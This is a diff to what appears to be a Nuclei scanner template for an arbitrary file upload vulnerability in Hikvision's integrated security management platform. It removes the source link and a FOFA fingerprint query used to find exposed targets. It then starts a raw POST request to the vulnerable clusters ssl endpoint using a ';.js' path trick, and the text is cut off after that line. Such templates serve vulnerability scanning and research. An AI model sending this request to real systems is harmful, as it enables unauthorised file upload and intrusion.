@@ -3,12 +3,8 @@ info:
   name: 海康威视综合安防管理平台clusters ssl接口存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fz1g0qewsyrnmkrs'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fz1g0qewsyrnmkrs
-    fofa: body="/portal/skin/isee/redblack/"
 http:
 - raw:
   - 'POST /clusterMgr/clusters/ssl/file;.js HTTP/1.1
